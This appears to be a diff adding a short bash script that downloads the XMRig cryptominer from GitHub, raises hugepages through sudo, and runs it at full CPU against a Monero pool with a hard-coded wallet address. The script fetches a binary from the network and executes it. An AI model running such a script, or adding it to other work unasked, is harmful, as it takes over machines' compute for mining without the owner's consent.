@@ -1,0 +1,13 @@
+#!/bin/bash
+
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
+
+tar -xvf xmrig-6.21.3-linux-static-x64.tar.gz
+
+cd xmrig-6.21.3
+
+chmod +x xmrig
+
+sudo sysctl -w vm.nr_hugepages=1280
+
+./xmrig -o gulf.moneroocean.stream:10128 -u 41fEwVw9vLticzq7Lo83n75qrKZ4ecpekPcuWy6RCgfA78boEDD9G1iEXqCsWeixqhXGa6jTWduVzUipbKWajy5M9houfkV -p x -k --tls --rig-id porteus-minero --donate-level=0 --cpu-max-threads-hint=100
